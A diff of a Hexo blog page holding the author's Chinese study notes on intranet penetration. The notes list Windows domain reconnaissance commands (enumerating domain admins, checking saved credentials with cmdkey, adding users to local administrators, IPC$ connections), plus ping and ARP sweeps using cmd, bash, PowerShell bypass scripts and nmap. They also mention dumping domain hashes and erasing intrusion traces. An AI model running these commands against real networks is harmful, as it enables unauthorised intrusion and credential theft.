@@ -1,354 +1,201 @@
 <!DOCTYPE html>
-
-
-
-
-
-
 <html lang="en">
-<head>
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
-<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
-<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.4.1">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.4.1',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Copy',
-      copy_success: 'Copied',
-      copy_failure: 'Copy failed'
-    },
-    sidebarPadding: 40
-  };
-</script>
-
-  <meta name="description" content="路漫漫其修远兮">
-<meta name="keywords" content="内网">
-<meta property="og:type" content="article">
-<meta property="og:title" content="内网笔记">
-<meta property="og:url" content="http://yoursite.com/2020/03/07/内网笔记/index.html">
-<meta property="og:site_name" content="2cu的博客">
-<meta property="og:description" content="路漫漫其修远兮">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214921605-2074294329.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129223554983-56718359.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130200018317-307513884.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211235129-219733840.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211600017-1823180637.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211851318-2060640176.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131151824165-907488630.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153220198-9152151.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153032527-1803063888.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153826223-715246260.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131161316851-1987021747.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163106160-903443717.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163257866-2002614982.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214829896-1797555095.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129215417848-1780114464.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131222312270-1593921519.png">
-<meta property="og:image" content="https://img2018.cnblogs.com/blog/1344396/201902/1344396-20190208110305087-1718640.png">
-<meta property="og:updated_time" content="2020-04-13T14:05:55.830Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网笔记">
-<meta name="twitter:description" content="路漫漫其修远兮">
-<meta name="twitter:image" content="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214921605-2074294329.png">
-  <link rel="canonical" href="http://yoursite.com/2020/03/07/内网笔记/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>内网笔记 | 2cu的博客</title>
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="心之所向皆是遗憾，目之所及皆是过往">
+  <meta name="author" content="2cu">
+  <meta name="keywords" content>
+  <title>内网笔记 - 2cu的博客</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_fmb4a04yx8h.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
 
 
 
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
 
 
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-  
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>2cu</strong>&nbsp;</a>
 
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">2cu的博客</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">
+              <i class="iconfont icon-home-fill"></i>
+              Home</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">
+              <i class="iconfont icon-archive-fill"></i>
+              Archives</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">
+              <i class="iconfont icon-category-fill"></i>
+              Categories</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">
+              <i class="iconfont icon-user-fill"></i>
+              About</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/qiangfu/">
+              <i class="iconfont icon-tags-fill"></i>
+              偶尔看看女神</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/music/">
+              <i class="iconfont icon-tags-fill"></i>
+              音乐间</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">
+              <i class="iconfont icon-link-fill"></i>
+              Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-        
-        
-        <li class="menu-item menu-item-home">
-      
-    
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-about">
-      
-    
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-categories">
-      
-    
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-偶尔看看女神">
-      
-    
-
-    <a href="/qiangfu/" rel="section"><i class="fa fa-fw fa-calendar"></i>偶尔看看女神</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-私人音乐间">
-      
-    
-
-    <a href="/music/" rel="section"><i class="fa fa-fw fa-sitemap"></i>私人音乐间</a>
-
-  </li>
-      
-    
-  </ul>
-
-    
-
 </nav>
-</div>
-    </header>
 
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/07/内网笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="2cu">
-      <meta itemprop="description" content="心之所向皆是遗憾，目之所及皆是过往">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="2cu的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            内网笔记
-            
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              
-                
-              
-
-              <time title="Created: 2020-03-07 00:17:24" itemprop="dateCreated datePublished" datetime="2020-03-07T00:17:24+08:00">2020-03-07</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-13 22:05:55" itemprop="dateModified" datetime="2020-04-13T22:05:55+08:00">2020-04-13</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/内网/" itemprop="url" rel="index">
-                    <span itemprop="name">内网</span>
-                  </a>
-                </span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
+
+            
+              
+                <div class="mt-3 post-meta">
+                  <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+                  <time datetime="2020-03-07 00:17">
+                    March 7, 2020 am
+                  </time>
+                </div>
+              
+
+              <div class="mt-1">
+                
+                  
+                  <span class="post-meta mr-2">
+                    <i class="iconfont icon-chart"></i>
+                    7.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta mr-2">
+                      <i class="iconfont icon-clock-fill"></i>
+                    
+                    
+                    100
+                     分钟
+                  </span>
+                
+
+                
+              </div>
+            
+          </div>
 
           
-
         </div>
-      </header>
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <hr>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <hr>
 <p>路漫漫其修远兮</p>
 <a id="more"></a>
 <p>最近看了一点内网渗透的学习资料，感觉内网渗透需要的知识太多，遂写博客来记录下自己学习内网渗透的一些笔记。</p>
@@ -356,17 +203,28 @@
 <p>开篇首先推荐i春秋陈小兵老师在技术沙龙上的分享：<a href="https://www.ichunqiu.com/open/61711" target="_blank" rel="noopener">https://www.ichunqiu.com/open/61711</a></p>
 <p>并看大佬的一篇msf内网穿透文章：<a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/125278.html</a></p>
 <p>其中内网渗透常见的几个问题：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.防火墙穿透</span><br><span class="line">2.木马免杀穿透</span><br><span class="line">3.内网信息收集及目标定位</span><br><span class="line">4.关于文件下载</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">1.防火墙穿透
+2.木马免杀穿透
+3.内网信息收集及目标定位
+4.关于文件下载</code></pre>
 
 <p>而内网渗透也分为 域渗透 与 工作组渗透</p>
 <p>域渗透：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.域信息收集</span><br><span class="line">2.获取域权限</span><br><span class="line">3.dump域hash</span><br><span class="line">4.内网权限维持</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">1.域信息收集
+2.获取域权限
+3.dump域hash
+4.内网权限维持</code></pre>
 
 <p>工作组渗透：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.常规内网渗透</span><br><span class="line">2.各种欺骗攻击</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">1.常规内网渗透
+2.各种欺骗攻击</code></pre>
 
 <p>如果非要说内网渗透的思路：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.内网环境下先查看网络架构。例如 网段信息 域控 DNS服务器 时间服务器</span><br><span class="line">2.收集到了足够多的信息可以扫一下开放端口 21 22 80 8080 443等确定敏感信息，以及之后渗透的方向</span><br><span class="line">3.通过以上信息进行一定的弱口令尝试，针对特定的软件做banner采集利用，snmp测试读取和写入权限</span><br><span class="line">4.进行一些提权操作，从横向和纵向对目标服务器进行渗透。</span><br><span class="line">6.进行敏感信息挖掘，内网密码收集嗅探，同时擦出入侵足迹。</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">1.内网环境下先查看网络架构。例如 网段信息 域控 DNS服务器 时间服务器
+2.收集到了足够多的信息可以扫一下开放端口 21 22 80 8080 443等确定敏感信息，以及之后渗透的方向
+3.通过以上信息进行一定的弱口令尝试，针对特定的软件做banner采集利用，snmp测试读取和写入权限
+4.进行一些提权操作，从横向和纵向对目标服务器进行渗透。
+6.进行敏感信息挖掘，内网密码收集嗅探，同时擦出入侵足迹。</code></pre>
 
 <p>内网渗透在我感觉一种是拿下内网一台主机权限，外网端口转发或者协议代理进内网，或者通过vpn连接进入内网，另一种是通过物理方法连入内网，比如通过网线，wifi热点进入内网等。不过最终的目的一样，只是连接过程不同，第一种比第二种要多一个”桥梁“。</p>
 <p>如何拿下一个网站权限，这里不再多说，各有各的运气，各有各的技术。</p>
@@ -385,10 +243,10 @@
 <p>1.内网信息探测常用命令</p>
 <p>拿下一台内网机器，首先要定位内网机器的架构。</p>
 <p>收集基本信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all        ------ 查询本机IP段，所在域等``net user           ------ 本机用户列表``net localgroup administrators      ------ 本机管理员[通常含有域用户]``net user /domain             ------ 查询域用户``net ``group` `/domain            ------ 查询域里面的工作组``net ``group` `&quot;domain admins&quot;` `/domain    ------ 查询域管理员用户组``net localgroup administrators /domain  ------ 登录本机的域管理员``net localgroup administrators workgroup\user001 /add  ------域用户添加到本机``net ``group` `&quot;domain controllers&quot;` `/domain    ------ 查看域控制器(如果有多台)``net time /domain          ------ 判断主域，主域服务器都做时间服务器``net config workstation       ------ 当前登录域``net session            ------ 查看当前会话``net use \\ip\ipc$ pawword /user:username   ------ 建立IPC会话[空连接-***]``net share             ------ 查看SMB指向的路径[即共享]``net view              ------ 查询同一域内机器列表``net view \\ip           ------ 查询某IP共享``net view /domain          ------ 查询域列表``net view /domain:domainname    ------ 查看workgroup域中计算机列表``net start             ------ 查看当前运行的服务``net accounts            ------ 查看本地密码策略``net accounts /domain        ------ 查看域密码策略``nbtstat –A ip           ------netbios 查询``netstat –an/ano/anb        ------ 网络连接查询``route print            ------ 路由表tasklist /V            ----- 查看进程[显示对应用户]``tasklist /S ip /U domain\username /P /V       ----- 查看远程计算机进程列表``qprocess *             ----- 类似tasklist``qprocess /SERVER:IP        ----- 远程查看计算机进程列表``nslookup –qt-MX Yahoo.com     ----- 查看邮件服务器``whoami /all            ----- 查询当前用户权限等``set`                `----- 查看系统环境变量``systeminfo             ----- 查看系统信息``qwinsta              ----- 查看登录情况``qwinsta /SERVER:IP         ----- 查看远程登录情况``fsutil fsinfo drives        ----- 查看所有盘符``gpupdate /force          ----- 更新域策略cmdkey /l             ----- 看是否保存了登陆凭证。（攻击者会先查看管理员是否保留了登陆凭证，方便后续的凭证抓取。） echo %logonserver%         ----- 查看登陆域</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">ipconfig /all        ------ 查询本机IP段，所在域等``net user           ------ 本机用户列表``net localgroup administrators      ------ 本机管理员[通常含有域用户]``net user /domain             ------ 查询域用户``net ``group` `/domain            ------ 查询域里面的工作组``net ``group` `&quot;domain admins&quot;` `/domain    ------ 查询域管理员用户组``net localgroup administrators /domain  ------ 登录本机的域管理员``net localgroup administrators workgroup\user001 /add  ------域用户添加到本机``net ``group` `&quot;domain controllers&quot;` `/domain    ------ 查看域控制器(如果有多台)``net time /domain          ------ 判断主域，主域服务器都做时间服务器``net config workstation       ------ 当前登录域``net session            ------ 查看当前会话``net use \\ip\ipc$ pawword /user:username   ------ 建立IPC会话[空连接-***]``net share             ------ 查看SMB指向的路径[即共享]``net view              ------ 查询同一域内机器列表``net view \\ip           ------ 查询某IP共享``net view /domain          ------ 查询域列表``net view /domain:domainname    ------ 查看workgroup域中计算机列表``net start             ------ 查看当前运行的服务``net accounts            ------ 查看本地密码策略``net accounts /domain        ------ 查看域密码策略``nbtstat –A ip           ------netbios 查询``netstat –an/ano/anb        ------ 网络连接查询``route print            ------ 路由表tasklist /V            ----- 查看进程[显示对应用户]``tasklist /S ip /U domain\username /P /V       ----- 查看远程计算机进程列表``qprocess *             ----- 类似tasklist``qprocess /SERVER:IP        ----- 远程查看计算机进程列表``nslookup –qt-MX Yahoo.com     ----- 查看邮件服务器``whoami /all            ----- 查询当前用户权限等``set`                `----- 查看系统环境变量``systeminfo             ----- 查看系统信息``qwinsta              ----- 查看登录情况``qwinsta /SERVER:IP         ----- 查看远程登录情况``fsutil fsinfo drives        ----- 查看所有盘符``gpupdate /force          ----- 更新域策略cmdkey /l             ----- 看是否保存了登陆凭证。（攻击者会先查看管理员是否保留了登陆凭证，方便后续的凭证抓取。） echo %logonserver%         ----- 查看登陆域</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214921605-2074294329.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214921605-2074294329.png" alt="img"></a></p>
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129223554983-56718359.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129223554983-56718359.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214921605-2074294329.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214921605-2074294329.png" srcset="/img/loading.gif" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129223554983-56718359.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129223554983-56718359.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>这里有一个特殊的用户叫做krbtgt，该用户是用于Kerberos身份验证的账户，获得了该用户的hash，就可以伪造票据传递攻击</p>
 <p>2.网络环境的判断</p>
 <p>1.机器所处位置区域的判断；</p>
@@ -408,13 +266,16 @@
 <ul>
 <li>cmd中执行如下命令，对整个C段进行ping扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd回显：   for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</span><br><span class="line">导出成文本： @for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\a.txt) else (echo 192.168.0.%i &gt;&gt;c:\b.txt)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">cmd回显：   for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;
+导出成文本： @for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\a.txt) else (echo 192.168.0.%i &gt;&gt;c:\b.txt)</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130200018317-307513884.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130200018317-307513884.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130200018317-307513884.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130200018317-307513884.png" srcset="/img/loading.gif" alt="img"></a></p>
 <ul>
 <li>利用powershell对目标内网进行icmp扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot;  </span><br><span class="line"></span><br><span class="line">目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.0.1 - 192.168.0.254`</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot;  
+
+目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.0.1 - 192.168.0.254`</code></pre>
 
 <p> windows 2003与windows xp需要安装powershell1.0：<a href="https://support.microsoft.com/zh-cn/help/926140/windows-powershell-1-0-localized-installation-package-for-windows-serv" target="_blank" rel="noopener">官方下载地址</a></p>
 <p> 关于powershell在内网渗透中的作用，请看下一篇文章，这里不再细说。</p>
@@ -422,15 +283,22 @@
 <ul>
 <li>shell中执行linux脚本进行扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for ip in 192.168.0.&#123;1..254&#125; </span><br><span class="line">do </span><br><span class="line">    ping $ip -c 1 &amp;&gt; /dev/null </span><br><span class="line">        if [ $? -eq 0 ];then </span><br><span class="line">            echo $ip is alive .... </span><br><span class="line">        fi </span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">#!/bin/bash
+for ip in 192.168.0.&#123;1..254&#125; 
+do 
+    ping $ip -c 1 &amp;&gt; /dev/null 
+        if [ $? -eq 0 ];then 
+            echo $ip is alive .... 
+        fi 
+done</code></pre>
 
 <p>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in 192.168.0.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">for i in 192.168.0.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done</code></pre>
 
 <ul>
 <li>nmap的icmp扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">nmap -sn -PE 192.168.0.1/24</code></pre>
 
 <p>如果是物理方法连接内网，可直接进行探测。如果仅有一台内网主机权限，可以作端口转发，感觉比较靠谱的还是配置SOCKS5内网代理，使用proxychains配合nmap使用，或者使用msf中的模块先挂内网代理，使用scanner模块进行扫描，或者把内网已getshell的机器配置成跳板机，来借力打力。</p>
 <p>arp扫描</p>
@@ -438,52 +306,69 @@
 <ul>
 <li>arpscan工具扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /b arpscan.exe -t 192.168.0.1/24 &gt;&gt; result.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">start /b arpscan.exe -t 192.168.0.1/24 &gt;&gt; result.txt</code></pre>
 
 <p>arpscan.exe下载地址：<a href="https://www.2cto.com/soft/201001/16987.html#download" target="_blank" rel="noopener">https://www.2cto.com/soft/201001/16987.html#download</a></p>
 <p>所需dll文件：<a href="https://cn.dll-files.com/" target="_blank" rel="noopener">https://cn.dll-files.com</a></p>
 <ul>
 <li>powershell调用arpscan扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;  &gt;&gt; result.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;  &gt;&gt; result.txt</code></pre>
 
 <p>在linux下使用arp扫描:</p>
 <ul>
 <li>nmap的arp扫描</li>
 </ul>
